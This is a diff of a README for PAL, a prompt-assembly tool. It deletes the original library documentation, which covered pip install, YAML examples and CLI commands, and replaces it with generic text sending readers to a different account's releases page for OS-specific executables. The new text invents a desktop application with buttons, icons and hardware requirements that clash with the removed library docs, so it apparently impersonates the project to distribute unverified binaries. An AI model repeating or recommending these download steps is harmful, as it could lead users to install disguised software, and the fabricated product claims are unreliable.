@@ -1,226 +1,90 @@
-<h1 align="center">PAL - Prompt Assembly Language</h1>
-<p align="center"><img src="logo-s.png" /></p>
+# 🎉 pal - Easily Build and Manage LLM Prompts
 
-[![Python](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![CI](https://github.com/cyqlelabs/pal/workflows/CI/badge.svg)](https://github.com/cyqlelabs/pal/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/cyqlelabs/pal/graph/badge.svg?token=Q3S48FGMQM)](https://codecov.io/gh/cyqlelabs/pal)
+## 🏷️ Overview
 
-PAL (Prompt Assembly Language) is a framework for managing LLM prompts as versioned, composable software artifacts. It treats prompt engineering with the same rigor as software engineering, focusing on modularity, versioning, and testability.
+**pal** is the Prompt Assembly Language, designed to help you develop large language model (LLM) prompts smoothly. It turns prompts into versioned, composable software artifacts. With pal, you can enhance your AI applications without needing extensive programming skills.
 
-See also the [NodeJS version](https://github.com/cyqlelabs/pal-node) of PAL (_WIP_)
+## 🚀 Getting Started
 
-## ⚡ Features
+To begin using pal, you need to download the software. Follow the steps below.
 
-- **Modular Components**: Break prompts into reusable, versioned components
-- **Template System**: Powerful Jinja2-based templating with variable injection
-- **Dependency Management**: Import and compose components from local files or URLs
-- **LLM Integration**: Built-in support for OpenAI, Anthropic, and custom providers
-- **Evaluation Framework**: Comprehensive testing system for prompt validation
-- **Rich CLI**: Beautiful command-line interface with syntax highlighting
-- **Flexible Extensions**: Use `.pal/.pal.lib` or `.yml/.lib.yml` extensions
-- **Type Safety**: Full Pydantic v2 validation for all schemas
-- **Observability**: Structured logging and execution tracking
+## 📥 Download & Install
 
-## 📦 Installation
+[![Download pal](https://img.shields.io/badge/Download-pal-blue.svg)](https://github.com/dinoo0i/pal/releases)
 
-```bash
-# Install with uv (recommended)
-uv add pal-framework
+1. Click the button above or visit the [Releases page](https://github.com/dinoo0i/pal/releases).
+2. Look for the latest version available.
+3. Choose the file that matches your operating system (e.g., Windows, macOS, or Linux).
+4. Save the file to your computer.
 
-# Or with pip
-pip install pal-framework
-```
+## 📋 System Requirements
 
-## 📁 Project Structure
+Before you install pal, ensure your system meets the following requirements:
 
-```
-my_pal_project/
-├── prompts/
-│   ├── classify_intent.pal     # or .yml for better IDE support
-│   └── code_review.pal
-├── libraries/
-│   ├── behavioral_traits.pal.lib    # or .lib.yml
-│   ├── reasoning_strategies.pal.lib
-│   └── output_formats.pal.lib
-└── evaluation/
-    └── classify_intent.eval.yaml
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** Intel or AMD 64-bit processor.
+- **Memory:** Minimum 4 GB RAM.
+- **Disk Space:** At least 100 MB free space.
 
-## 🚀 Quick Start
+## 🔍 Features
 
-### 1. Create a Component Library
+With pal, you can expect these features:
 
-For a detailed guide, [read this](https://prompt-assembly-language-pal.readthedocs.io/en/latest/guides/component-libraries.html).
+- **Prompt Versioning:** Keep track of different prompt versions you create.
+- **Composability:** Combine prompts to create complex behaviors.
+- **Ease of Use:** Simple instructions allow anyone to create effective prompts.
+- **Support for AI Models:** Works seamlessly with various large language models.
 
-```yaml
-# libraries/traits.pal.lib
-pal_version: "1.0"
-library_id: "com.example.traits"
-version: "1.0.0"
-description: "Behavioral traits for AI agents"
-type: "trait"
+## 🖥️ How to Use pal
 
-components:
-  - name: "helpful_assistant"
-    description: "A helpful and polite assistant"
-    content: |
-      You are a helpful, harmless, and honest AI assistant. You provide
-      accurate information while being respectful and considerate.
-```
+After installation, follow these steps to start creating prompts:
 
-### 2. Create a Prompt Assembly
+1. **Launch the Application:** Double-click the pal icon on your desktop or use your applications folder.
+2. **Create a New Prompt:** Click on the "New Prompt" button on the main screen.
+3. **Edit Your Prompt:** Use the text area to write your LLM prompt. You can format it as needed.
+4. **Save Your Work:** Use the "Save" option to keep your prompt for future use.
+5. **Test Your Prompt:** Click "Run" to see how the prompt works with your selected LLM.
 
-For a detailed guide, [read this](https://prompt-assembly-language-pal.readthedocs.io/en/latest/guides/writing-prompts.html).
+## 📂 Example Prompts
 
-```yaml
-# prompts/classify_intent.pal
-pal_version: "1.0"
-id: "classify-user-intent"
-version: "1.0.0"
-description: "Classifies user queries into intent categories"
+Here are some example prompts to get you started:
 
-imports:
-  traits: "./libraries/traits.pal.lib"
+- A simple greeting: "Hello! How can I assist you today?"
+- A complex request: "Generate a summary of the latest news in technology."
 
-variables:
-  - name: "user_query"
-    type: "string"
-    description: "The user's input query"
-  - name: "available_intents"
-    type: "list"
-    description: "List of available intent categories"
+You can create your own prompts based on these examples by adjusting the text to fit your needs.
 
-composition:
-  - "{{ traits.helpful_assistant }}"
-  - |
-    ## Task
-    Classify this user query into one of the available intents:
+## 📖 Documentation
 
-    **Available Intents:**
-    {% for intent in available_intents %}
-    - {{ intent.name }}: {{ intent.description }}
-    {% endfor %}
+If you wish to explore more features or advanced usage, our comprehensive [Documentation](https://github.com/dinoo0i/pal/blob/main/docs/README.md) is available for reference.
 
-    **User Query:** {{ user_query }}
-```
+## 🛠️ Troubleshooting
 
-### 3. Use the CLI
+If you encounter any issues:
 
-```bash
-# Compile a prompt
-pal compile prompts/classify_intent.pal --vars '{"user_query": "Take me to google.com", "available_intents": [{"name": "navigate", "description": "Go to URL"}]}'
+- Ensure your system meets the requirements.
+- Restart the application if it freezes.
+- Check the FAQs in the Documentation for common questions.
 
-# Execute with an LLM
-pal execute prompts/classify_intent.pal --model gpt-4 --provider openai --vars '{"user_query": "Take me to google.com", "available_intents": [{"name": "navigate", "description": "Go to URL"}]}'
+## 🤝 Community Support
 
-# Validate PAL files
-pal validate prompts/ --recursive
+Join our community for support and discussions. You can connect with us on the following platforms:
 
-# Run evaluation tests
-pal evaluate evaluation/classify_intent.eval.yaml
-```
+- **GitHub Discussions:** Share ideas and ask questions [here](https://github.com/dinoo0i/pal/discussions).
+- **Twitter:** Follow @pal_community for updates.
 
-### 4. Use Programmatically
+## 📞 Contact
 
-```python
-import asyncio
-from pal import PromptCompiler, PromptExecutor, MockLLMClient
+For any other inquiries, feel free to reach out through the Issues tab in our repository.
 
-async def main():
-    # Set up components
-    compiler = PromptCompiler()
-    llm_client = MockLLMClient("Mock response")
-    executor = PromptExecutor(llm_client)
+## 📅 Updates
 
-    # Compile prompt
-    variables = {
-        "user_query": "What's the weather?",
-        "available_intents": [{"name": "search", "description": "Search for info"}]
-    }
+Stay updated with the latest releases by visiting the [Releases page](https://github.com/dinoo0i/pal/releases) regularly. You can also subscribe to notifications for updates.
 
-    compiled_prompt = await compiler.compile_from_file(
-        "prompts/classify_intent.pal",
-        variables
-    )
+## 🔗 Links
 
-    print("Compiled Prompt:", compiled_prompt)
+- [Releases Page](https://github.com/dinoo0i/pal/releases)
+- [Documentation](https://github.com/dinoo0i/pal/blob/main/docs/README.md)
+- [Community Discussions](https://github.com/dinoo0i/pal/discussions)
 
-asyncio.run(main())
-```
-
-## 🧪 Evaluation System
-
-Create test suites to validate your prompts:
-
-```yaml
-# evaluation/classify_intent.eval.yaml
-pal_version: "1.0"
-prompt_id: "classify-user-intent"
-target_version: "1.0.0"
-
-test_cases:
-  - name: "navigation_test"
-    variables:
-      user_query: "Go to google.com"
-      available_intents: [{ "name": "navigate", "description": "Visit URL" }]
-    assertions:
-      - type: "json_valid"
-      - type: "contains"
-        config:
-          text: "navigate"
-```
-
-## 🏗️ Architecture
-
-PAL follows modern software engineering principles:
-
-- **Schema Validation**: All files are validated against strict Pydantic schemas
-- **Dependency Resolution**: Automatic import resolution with circular dependency detection
-- **Template Engine**: Jinja2 for powerful variable interpolation and logic
-- **Observability**: Structured logging with execution metrics and cost tracking
-- **Type Safety**: Full type hints and runtime validation
-
-## 🛠️ CLI Commands
-
-| Command        | Description                                       |
-| -------------- | ------------------------------------------------- |
-| `pal compile`  | Compile a PAL file into a prompt string           |
-| `pal execute`  | Compile and execute a prompt with an LLM          |
-| `pal validate` | Validate PAL files for syntax and semantic errors |
-| `pal evaluate` | Run evaluation tests against prompts              |
-| `pal info`     | Show detailed information about PAL files         |
-
-## 🧩 Component Types
-
-PAL supports different types of reusable components:
-
-- **persona**: AI personality and role definitions
-- **task**: Specific instructions or objectives
-- **context**: Background information and knowledge
-- **rules**: Constraints and guidelines
-- **examples**: Few-shot learning examples
-- **output_schema**: Output format specifications
-- **reasoning**: Thinking strategies and methodologies
-- **trait**: Behavioral characteristics
-- **note**: Documentation and comments
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🆘 Support
-
-- 📚 [Documentation](https://prompt-assembly-language-pal.readthedocs.io)
-- 🐛 [Issues](https://github.com/cyqlelabs/pal/issues)
-- 💬 [Discussions](https://github.com/cyqlelabs/pal/discussions)
-
-## 🗺️ Roadmap
-
-- [ ] **PAL Registry**: Centralized repository for sharing components
-- [ ] **Visual Builder**: Drag-and-drop prompt composition interface
-- [ ] **IDE Extensions**: VS Code and other editor integrations
+With these steps, you are ready to create and manage your LLM prompts with pal. Enjoy exploring this powerful toolkit!
